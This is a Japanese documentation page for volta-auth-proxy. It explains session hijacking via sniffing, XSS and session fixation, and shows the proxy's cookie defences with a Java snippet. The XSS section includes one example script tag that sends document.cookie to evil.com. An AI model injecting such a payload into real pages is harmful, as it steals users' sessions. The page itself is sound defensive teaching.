# セッションハイジャック

[English version](session-hijacking.md)

---

## これは何？

セッションハイジャックとは、攻撃者がセッション識別子を盗むか推測して、パスワードを知らなくてもあなたになりすます攻撃です。ホテルのルームキーをコピーされるようなものです。コピーしたカードでドアを開けても、ドアには区別がつきません。

攻撃者は暗号を解読する必要もパスワードを推測する必要もありません。セッション Cookie の値さえ手に入れればいいのです。

---

## なぜ重要？

ハイジャックされたセッションにより、攻撃者はあなたができることすべてにアクセスできます。非公開データの閲覧、設定の変更、ユーザーの招待、削除まで。正規のセッションを使っているため、サーバーからは攻撃者があなた自身に見えます。ログイン失敗のアラートも鳴りません。

---

## どうやって起きる？

### 1. ネットワーク盗聴（TLS なしの HTTP）
サイトが平文の HTTP を使っていると、同じ Wi-Fi（カフェ、空港）にいる誰でもCookie を見ることができます。Wireshark などのツールで簡単に取得可能です。

**対策：** 常に HTTPS を使用。Cookie に `Secure` フラグを設定し、HTTP では送信されないように。

### 2. クロスサイトスクリプティング（XSS）
攻撃者がページに JavaScript を注入すると（`<script>fetch('https://evil.com?c='+document.cookie)</script>`）、Cookie を読み取って外部に送信できます。

**対策：** セッション Cookie に `HttpOnly` フラグを設定。JavaScript から完全に見えなくなります。

### 3. セッション固定化
攻撃者が、あなたのログイン**前に**セッション ID を知っている値にセットします。あなたがログインすると、攻撃者は既に有効なセッション ID を持っています。

**対策：** ログイン時に新しいセッション ID を生成。認証前のセッション ID を再利用しない。

---

## 簡単な例

```
同じ Wi-Fi 上の攻撃者、サイトは HTTP 使用：

[あなた]  -->  GET /dashboard  -->  [サーバー]
               Cookie: session=abc123
               （平文で送信！）

[攻撃者がネットワークを盗聴]
「session=abc123 を入手」

[攻撃者] -->  GET /dashboard  -->  [サーバー]
              Cookie: session=abc123
              サーバー: 「おかえりなさい、ユーザーさん！」
```

HTTPS + Secure フラグがあれば、Cookie は通信中に暗号化され、HTTP では送信されません。

---

## volta-auth-proxy では

volta は複数の防御層を適用しています：

| 防御策 | volta での実装 |
|--------|--------------|
| **Secure フラグ** | HTTPS リクエスト時に Cookie に `Secure` を付与（`ctx.req().isSecure()`） |
| **HttpOnly フラグ** | 常に設定。JavaScript からセッション Cookie を読めない |
| **SameSite=Lax** | クロスオリジン POST で Cookie が送信されず、CSRF リスクを低減 |
| **UUID セッション ID** | セッション ID はランダムな UUID（122ビットのエントロピー）で推測不可能 |
| **サーバー側セッション** | セッションは Postgres に保存。個別に無効化可能 |
| **IP + User-Agent 記録** | 各セッションは `ip_address` と `user_agent` を監査用に記録 |

Cookie は `setSessionCookie()` で設定されます：

```java
String cookie = "volta_session=" + sessionId
    + "; Path=/; Max-Age=" + sessionTtlSeconds
    + "; HttpOnly; SameSite=Lax";
if (ctx.req().isSecure()) {
    cookie += "; Secure";
}
```

セッションのハイジャックが疑われる場合、管理者は `invalidated_at` を設定して即座に攻撃者をロックアウトできます。

---

## 関連項目

- [session-storage-strategies.md](session-storage-strategies.md) -- サーバー側セッションが無効化を可能にする理由
- [sliding-window-expiry.md](sliding-window-expiry.md) -- タイムアウトがハイジャックの被害時間を制限する仕組み
